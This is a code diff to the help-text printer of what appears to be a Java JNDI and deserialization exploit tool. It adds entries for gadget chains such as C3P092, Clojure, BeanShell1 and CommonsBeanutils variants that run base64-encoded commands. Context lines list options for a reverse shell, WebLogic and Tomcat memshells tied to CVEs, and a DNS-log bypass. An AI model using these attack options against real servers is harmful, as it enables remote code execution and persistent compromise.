@@ -91,6 +91,15 @@ public class Config {
             System.out.println("    " + prefix + "Deserialization/CommonsCollections5/Command/Base64/[base64_encoded_cmd]");
             System.out.println("    " + prefix + "Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]");
             System.out.println("    " + prefix + "Deserialization/CommonsCollections7/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/C3P092/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/Click1/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/Clojure/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/AspectJWeaver/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils3183/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/BeanShell1/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils2NOCC/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils3/Command/Base64/[base64_encoded_cmd]");
+            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils1183NOCC/Command/Base64/[base64_encoded_cmd]");
             System.out.println("    " + prefix + "Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported");
             System.out.println("    " + prefix + "Deserialization/CommonsBeanutils2/TomcatEcho");
             System.out.println("    " + prefix + "Deserialization/C3P0/SpringEcho");
@@ -98,6 +107,7 @@ public class Config {
             System.out.println("    " + prefix + "Deserialization/Jre8u20/TomcatMemshell");
             System.out.println("    " + prefix + "Deserialization/CVE_2020_2555/WeblogicMemshell1");
             System.out.println("    " + prefix + "Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells");
+
 
             System.out.println("\n[+] TomcatBypass Queries");
             System.out.println("    " + prefix + "TomcatBypass/Dnslog/[domain]");
